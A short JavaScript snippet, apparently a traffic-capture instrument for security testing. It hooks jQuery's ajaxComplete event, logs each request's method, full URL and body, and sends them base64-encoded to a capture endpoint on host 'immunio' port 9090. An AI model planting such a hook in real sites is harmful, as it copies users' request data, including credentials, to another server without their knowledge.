function SEND(data){
    var http = new XMLHttpRequest();
    var url = "http://immunio:9090/capture?data="+window.btoa(data);
    http.open("GET", url, true);
    http.onreadystatechange = function() {
        if(http.readyState == 4 && http.status == 200) {
            console.log(http.responseText);
        }
    }
    http.send();
}

$(document).ajaxComplete(function myErrorHandler(event, xhr, ajaxOptions, thrownError) {
  
      var url = '';
      if (String(ajaxOptions.url).indexOf("://") === -1){
          url = window.location.href.replace(location.hash, "");
          if (ajaxOptions.url.startsWith('/')){
             url = url.substring(0, url.lastIndexOf("/")) + ajaxOptions.url;
          }
          else{
          url = url.substring(0, url.lastIndexOf("/")) + "/" + ajaxOptions.url;
          }
      }
      else{
          url = ajaxOptions.url;
      }
      console.log(ajaxOptions.type +" "+url + " DATA: "+ ajaxOptions.data);
      SEND('{"method": "'+ajaxOptions.type +'", "url": "'+ url+ '", "body": "'+ajaxOptions.data+'"}');
  
});
